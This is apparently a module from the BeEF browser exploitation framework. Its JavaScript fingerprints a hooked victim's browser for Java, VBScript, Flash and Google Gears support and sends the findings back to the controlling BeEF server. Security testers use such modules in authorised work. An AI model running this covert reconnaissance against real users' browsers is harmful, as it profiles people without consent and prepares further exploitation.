//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

function serialize(_obj)
{
   // Let Gecko browsers do this the easy way
   if (typeof _obj.toSource !== 'undefined' && typeof _obj.callee === 'undefined')
   {
      return _obj.toSource();
   }

   // Other browsers must do it the hard way
   switch (typeof _obj)
   {
      // numbers, booleans, and functions are trivial:
      // just return the object itself since its default .toString()
      // gives us exactly what we want
      case 'number':
      case 'boolean':
      case 'function':
         return _obj;
         break;

      // for JSON format, strings need to be wrapped in quotes
      case 'string':
         return '\'' + _obj + '\'';
         break;

      case 'object':
         var str;
         if (_obj.constructor === Array || typeof _obj.callee !== 'undefined')
         {
            str = '[';
            var i, len = _obj.length;
            for (i = 0; i < len-1; i++) { str += serialize(_obj[i]) + ','; }
            str += serialize(_obj[i]) + ']';
         }
         else
         {
            str = '{';
            var key;
            for (key in _obj) { str += key + ':' + serialize(_obj[key]) + ','; }
            str = str.replace(/\,$/, '') + '}';
         }
         return str;
         break;

      default:
         return 'UNKNOWN';
         break;
	}
}

	
    var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
    var vbscript_enabled = (beef.browser.hasVBScript())? "Yes" : "No";
    var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
    var has_googlegears = (beef.browser.hasGoogleGears())? "Yes" : "No";
   
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&has_googlegears='+has_googlegears);
});
